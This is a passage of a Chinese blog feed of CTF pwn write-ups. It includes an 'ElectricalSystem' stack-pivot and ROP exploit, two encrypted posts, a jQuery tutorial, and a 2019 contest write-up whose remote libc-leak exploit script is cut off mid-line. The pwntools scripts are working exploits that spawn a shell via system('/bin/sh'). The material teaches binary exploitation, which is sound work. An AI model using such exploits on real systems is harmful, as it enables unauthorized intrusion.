class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>接着我们进入sub_400AEE((__int64)&v4); 并发现溢出点</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_400AEE(__int64 a1)</span><br><span class="line">{</span><br><span class="line">  __int64 buf; // [rsp+8h] [rbp-8h]</span><br><span class="line">  buf = a1;</span><br><span class="line">  puts(byte_400E45);</span><br><span class="line">  puts("Check: view your electricity Balance");</span><br><span class="line">  puts("Recharge: add more money to your card:");</span><br><span class="line">  puts("Exit: Exit the System");</span><br><span class="line">  puts("Please enter your choice:");</span><br><span class="line">  read(0, &buf, 0x20uLL);   //找到溢出点，这个buf很明显溢出了</span><br><span class="line">  if ( strstr((const char *)&buf, "Check") )</span><br><span class="line">    return sub_400A3A(&buf, "Check");</span><br><span class="line">  if ( !strstr((const char *)&buf, "Recharge") )</span><br><span class="line">  {</span><br><span class="line">    if ( strstr((const char *)&buf, "Exit") )</span><br><span class="line">    {</span><br><span class="line">      puts("Ok,bye~");</span><br><span class="line">      exit(0);</span><br><span class="line">    }</span><br><span class="line">    puts("Incorrect choice!");</span><br><span class="line">    exit(0);</span><br><span class="line">  }</span><br><span class="line">  return sub_400A6F();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="1、首先我们把ROP的数据写到bss段，然后通过sub-400AEE函数覆盖ebp，把栈迁移到bss段，这样就可以执行ROP了"><a href="#1、首先我们把ROP的数据写到bss段，然后通过sub-400AEE函数覆盖ebp，把栈迁移到bss段，这样就可以执行ROP了" class="headerlink" title="1、首先我们把ROP的数据写到bss段，然后通过sub_400AEE函数覆盖ebp，把栈迁移到bss段，这样就可以执行ROP了"></a>1、首先我们把ROP的数据写到bss段，然后通过sub_400AEE函数覆盖ebp，把栈迁移到bss段，这样就可以执行ROP了</h3><h3 id="2、ROP第一次执行的目的是为了溢出libc版本，通过puts函数即可。"><a href="#2、ROP第一次执行的目的是为了溢出libc版本，通过puts函数即可。" class="headerlink" title="2、ROP第一次执行的目的是为了溢出libc版本，通过puts函数即可。"></a>2、ROP第一次执行的目的是为了溢出libc版本，通过puts函数即可。</h3><h3 id="3、跳转到read-plt，并构造好参数。注意read有三个参数，前两个参数我们可以控制，第三个参数我们无法控制，但是根据调试的结果看第三个参数（位于edx）数值非常大，也就是说我们读入很长很长的数据，所以我们本身不需要对read的第三个参数进行赋值，所以只需要传入两个参数就好了，然后第二个参数继续指向bss段，我是选择bss段再加一段偏移，恰好使得esp等于第二个参数，这样就不用传入重复的数据了，当然如果依旧指向bss段也是可以的，但是传入的数据有些长罢了。"><a href="#3、跳转到read-plt，并构造好参数。注意read有三个参数，前两个参数我们可以控制，第三个参数我们无法控制，但是根据调试的结果看第三个参数（位于edx）数值非常大，也就是说我们读入很长很长的数据，所以我们本身不需要对read的第三个参数进行赋值，所以只需要传入两个参数就好了，然后第二个参数继续指向bss段，我是选择bss段再加一段偏移，恰好使得esp等于第二个参数，这样就不用传入重复的数据了，当然如果依旧指向bss段也是可以的，但是传入的数据有些长罢了。" class="headerlink" title="3、跳转到read_plt，并构造好参数。注意read有三个参数，前两个参数我们可以控制，第三个参数我们无法控制，但是根据调试的结果看第三个参数（位于edx）数值非常大，也就是说我们读入很长很长的数据，所以我们本身不需要对read的第三个参数进行赋值，所以只需要传入两个参数就好了，然后第二个参数继续指向bss段，我是选择bss段再加一段偏移，恰好使得esp等于第二个参数，这样就不用传入重复的数据了，当然如果依旧指向bss段也是可以的，但是传入的数据有些长罢了。"></a>3、跳转到read_plt，并构造好参数。注意read有三个参数，前两个参数我们可以控制，第三个参数我们无法控制，但是根据调试的结果看第三个参数（位于edx）数值非常大，也就是说我们读入很长很长的数据，所以我们本身不需要对read的第三个参数进行赋值，所以只需要传入两个参数就好了，然后第二个参数继续指向bss段，我是选择bss段再加一段偏移，恰好使得esp等于第二个参数，这样就不用传入重复的数据了，当然如果依旧指向bss段也是可以的，但是传入的数据有些长罢了。</h3><h3 id="4、-根据（3），我们需要继续发送数据到bss段中构造ROP，由于我们已经获得了libc基址和偏移，所以我们可以直接传入-bin-sh的参数到rdi，传入并跳转到system的地址，拿到shell"><a href="#4、-根据（3），我们需要继续发送数据到bss段中构造ROP，由于我们已经获得了libc基址和偏移，所以我们可以直接传入-bin-sh的参数到rdi，传入并跳转到system的地址，拿到shell" class="headerlink" title="4、 根据（3），我们需要继续发送数据到bss段中构造ROP，由于我们已经获得了libc基址和偏移，所以我们可以直接传入/bin/sh的参数到rdi，传入并跳转到system的地址，拿到shell"></a>4、 根据（3），我们需要继续发送数据到bss段中构造ROP，由于我们已经获得了libc基址和偏移，所以我们可以直接传入/bin/sh的参数到rdi，传入并跳转到system的地址，拿到shell</h3><p>附上exp</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./ElectricalSystem")</span><br><span class="line">elf = ELF("ElectricalSystem")</span><br><span class="line">rdi_ret = 0x0000000000400d43</span><br><span class="line">rsi_r15_ret = 0x0000000000400d41</span><br><span class="line">shellcode_addr = 0x00000000006020E0</span><br><span class="line">sh.recvuntil("Please enter your electric card 's ID:")</span><br><span class="line">sh.recvuntil("Please enter your choice:\n")</span><br><span class="line">payload = p64(0x0000000000602140) + p64(rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts'])</span><br><span class="line">payload += p64(rdi_ret) + p64(0)</span><br><span class="line">payload += p64(rsi_r15_ret) + p64(shellcode_addr+80) + p64(0)</span><br><span class="line">payload += p64(elf.plt['read'])</span><br><span class="line">sh.send(payload)</span><br><span class="line">for i in range(0,5):</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(1)</span><br><span class="line">leave_ret = 0x0000000000400a38</span><br><span class="line">sh.send("Checkaaa" + p64(shellcode_addr) + p64(leave_ret))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(" hour\n",True)</span><br><span class="line">libc = u64(sh.recv(6)+"\x00\x00")</span><br><span class="line">log.success("__libc_start_main :"+hex(libc))</span><br><span class="line">payload = p64(rdi_ret) + p64(libc + 0x1923ea) + p64(libc+0x2d990)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="执行结果："><a href="#执行结果：" class="headerlink" title="执行结果："></a>执行结果：</h2><p><a href="/2019/05/08/CTF-Pwn-ElectricalSystem/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/05/08/CTF-Pwn-ElectricalSystem/2.png" class="lazyload"></a><br>注意，remote时，要注意延迟问题，还需要对代码进行校正</p><p>总结：这道题考察了栈迁移和ROP的技术，通过覆盖ebp并执行leave汇编，将栈迁移到我们想要的地方，并且在栈中存放ROP并执行，若read的长度不够，可以通过二次read继续对ROP存放地址进行扩充。总体来说这题较为简单。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-dl_resolve详解</title>
      <link href="/2019/05/07/CTF-Pwn-dl_resolve%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/05/07/CTF-Pwn-dl_resolve%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="f95a63108080639366857befff97fbe8dd05ae50f9e358e7cb22d8f327256b2b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-use_after_use</title>
      <link href="/2019/05/03/CTF-Pwn-use_after_use/"/>
      <url>/2019/05/03/CTF-Pwn-use_after_use/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="262d7689da7595730a0e21359574c304eedfdb39db019e323d7bb5696771baa8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jquery-常用教程</title>
      <link href="/2019/04/26/Jquery-%E5%B8%B8%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/04/26/Jquery-%E5%B8%B8%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Jquery-常用教程"><a href="#Jquery-常用教程" class="headerlink" title="Jquery-常用教程"></a>Jquery-常用教程</h2><h2 id="一、动态绑定元素事件"><a href="#一、动态绑定元素事件" class="headerlink" title="一、动态绑定元素事件"></a>一、动态绑定元素事件</h2><hr><h3 id="适用场合：ajax从后端传来数据，需要在前端进行显示并操作"><a href="#适用场合：ajax从后端传来数据，需要在前端进行显示并操作" class="headerlink" title="适用场合：ajax从后端传来数据，需要在前端进行显示并操作"></a>适用场合：ajax从后端传来数据，需要在前端进行显示并操作</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$("欲绑定元素的parent").on("click","#欲绑定元素",function(){</span><br><span class="line">事件</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">我们常用以下例子</span><br><span class="line">$(document).on("click","#someButton",function(){</span><br><span class="line">alert("Ok! You are so good!");</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">$("#ID").click(function(){</span><br><span class="line">alert("Ok! You are so good!");</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure></div><h2 id="二、AJAX"><a href="#二、AJAX" class="headerlink" title="二、AJAX"></a>二、AJAX</h2><hr><h3 id="适用场合：前后端交互"><a href="#适用场合：前后端交互" class="headerlink" title="适用场合：前后端交互"></a>适用场合：前后端交互</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$.ajax({</span><br><span class="line">url:"/login_student",</span><br><span class="line">dataType:"json",</span><br><span class="line">type:"post",</span><br><span class="line">data:$("#loginForm").serialize(),</span><br><span class="line">async:true,</span><br><span class="line">success:function(data){</span><br><span class="line">alert(data);</span><br><span class="line">},</span><br><span class="line">error:function(data){</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure></div><h3 id="AJAX的json数据的遍历"><a href="#AJAX的json数据的遍历" class="headerlink" title="AJAX的json数据的遍历"></a>AJAX的json数据的遍历</h3><h3 id="便于我们能够找到对应的数据"><a href="#便于我们能够找到对应的数据" class="headerlink" title="便于我们能够找到对应的数据"></a>便于我们能够找到对应的数据</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$.ajax({</span><br><span class="line">url:"/login_student",</span><br><span class="line">dataType:"json",</span><br><span class="line">type:"post",</span><br><span class="line">data:$("#loginForm").serialize(),</span><br><span class="line">async:true,</span><br><span class="line">success:function(data){</span><br><span class="line">$.echo(data,function(key,value){</span><br><span class="line">alert("key: " + key + "    " + "value: " +value);</span><br><span class="line">});</span><br><span class="line">},</span><br><span class="line">error:function(data){</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 计算机理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019国赛预选赛</title>
      <link href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/"/>
      <url>/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>我太菜了，只写出两个pwn和re，都是签到水平</p><h1 id="pwn篇"><a href="#pwn篇" class="headerlink" title="pwn篇"></a>pwn篇</h1><h2 id="0x01-easypwn"><a href="#0x01-easypwn" class="headerlink" title="0x01 easypwn"></a>0x01 easypwn</h2><p><a href="yourpwn">yourpwn</a><br>将程序拖入IDA</p><h3 id="Main函数"><a href="#Main函数" class="headerlink" title="Main函数"></a>Main函数</h3><p><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/1.png" class="lazyload"></a></p><h3 id="sub-B35"><a href="#sub-B35" class="headerlink" title="sub_B35()"></a>sub_B35()</h3><p><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/2.png" class="lazyload"></a></p><p>首先这是一个明显的下标溢出漏洞，而且在printf(“now value(hex) %x\n”, (unsigned int)v4[v1]);输出栈中的数据，一个想法就是先溢出libc版本，然后构造ROP执行system(“/bin/sh\x00”)<br>但是我们用checksec检查一下保护发现，保护全部开启了，包括pie，这意味着我们的所有地址都是偏移地址，具体地址是不知道的。<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/3.png" class="lazyload"></a></p><p>但是我们可以通过printf(“now value(hex) %x\n”, (unsigned int)v4[v1]);，来获得ret处的地址，从而得到基址，然后得到基址后，在根据偏移量算出所有plt和函数的地址，我们继续再ret下的内存地址中写入puts的plt地址和<strong>libc_start_main的值，这样就可以通过puts的plt来输出</strong>libc_start_main的值由于libc文件可以通过后3位不变的量来确定，由于for循环有40次，所以一定要输入满40次才可以进入ROP，通过下述代码可以得到__libc_start_main的值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./pwn")</span><br><span class="line">sh = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com",57856)</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">sh.sendline(p64(0x1))</span><br><span class="line">sh.recv()</span><br><span class="line">last = 0;</span><br><span class="line">base_addr = 0;</span><br><span class="line">for i in range(344,352):</span><br><span class="line">    sh.sendline(str(i))</span><br><span class="line">    s = sh.recvuntil("now value(hex) ")</span><br><span class="line">    s = sh.recv() </span><br><span class="line">    print s</span><br><span class="line">    s = s[:s.find('\n')]</span><br><span class="line">    s = s[-2:]</span><br><span class="line">    if(i==345):</span><br><span class="line">        last = (int(s,16)>>4)<<4</span><br><span class="line">    print s</span><br><span class="line">    base_addr += (int(s,16)<<(i-344)*8)</span><br><span class="line">    print base_addr</span><br><span class="line">    sh.sendline(str(int(s,16)))</span><br><span class="line">    sh.recv()</span><br><span class="line">def write(offset,data):</span><br><span class="line">    sh.sendline(str(offset))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    sh.recv()</span><br><span class="line">__libc_start_main = (0x202050 + ((base_addr>>12)<<12))</span><br><span class="line">print hex(base_addr)</span><br><span class="line">print hex(__libc_start_main)</span><br><span class="line">p = 344;</span><br><span class="line">write(344,"3")</span><br><span class="line">write(345,str(last+0xd))</span><br><span class="line">write(352,str(__libc_start_main % 0x100))</span><br><span class="line">write(353,str((__libc_start_main>>8) % 0x100))</span><br><span class="line">write(354,str((__libc_start_main>>16) % 0x100))</span><br><span class="line">write(355,str((__libc_start_main>>24) % 0x100))</span><br><span class="line">write(356,str((__libc_start_main>>32) % 0x100))</span><br><span class="line">write(357,str((__libc_start_main>>40) % 0x100))</span><br><span class="line">write(360,str("176"))</span><br><span class="line">write(361,str(last+0x8))</span><br><span class="line">write(362,str((base_addr>>16) % 0x100))</span><br><span class="line">write(363,str((base_addr>>24) % 0x100))</span><br><span class="line">write(364,str((base_addr>>32) % 0x100))</span><br><span class="line">write(365,str((base_addr>>40) % 0x100))</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果:"></a>执行结果:</h3><p><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/4.png" class="lazyload"></a></p><p>得到<strong>libc_start_main的值后我们进入<a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>来查询libc，只需要搜索</strong>libc_start_main  740<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/5.png" class="lazyload"></a></p><p>然后选择第一个，如果不行可以换第二个第三个，但是根据具体的情况来说第一个就是正确的libc<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/6.png" class="lazyload"></a></p><p>所以根据已知的<strong>libc_start_main的值，我们可以算出system和bin_sh<br>于是第一次构造rop只需要输出</strong>libc_start_main的值，然后再返回到main函数，再构造rop跳转到libc空间执行system(“/bin/sh\x00”)<br>注意了因为这是一个64位程序，必须要跳到 pop edi ，ret的汇编指令上进行传参，我们可以通过ROPgadget –binary pwn –only “ret|pop”来查询，结果如下<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/7.png" class="lazyload"></a></p><h2 id="接下来附上exp"><a href="#接下来附上exp" class="headerlink" title="接下来附上exp"></a>接下来附上exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com",57856)</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">libc = ELF("libc6_2.23.so")</span><br><span class="line">sh.sendline(p64(0x1))</span><br><span class="line">sh.recv()</span><br><span class="line">last = 0;</span><br><span class="line">base_addr = 0;</span><br><span class="line">for i in range(344,352):</span><br><span class="line">    sh.sendline(str(i))</span><br><span class="line">    s = sh.recvuntil("now value(hex) ")</span><br><span class="line">    s = sh.recv()</span><br><span class="line">    print s</span><br><span class="line">    s = s[:s.find('\n')]</span><br><span class="line">    s = s[-2:]</span><br><span class="line">    if(i==345):</span><br><span class="line">        last = (int(s,16)>>4)<<4</span><br><span class="line">    print s</span><br><span class="line">    base_addr += (int(s,16)<<(i-344)*8)</span><br><span class="line">    print base_addr</span><br><span class="line">    sh.sendline(str(int(s,16)))</span><br><span class="line">    sh.recv()</span><br><span class="line">def write(offset,data):</span><br><span class="line">    sh.sendline(str(offset))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    sh.recv()</span><br><span class="line">__libc_start_main = (0x202050 + ((base_addr>>12)<<12))</span><br><span class="line">print hex(base_addr)</span><br><span class="line">print 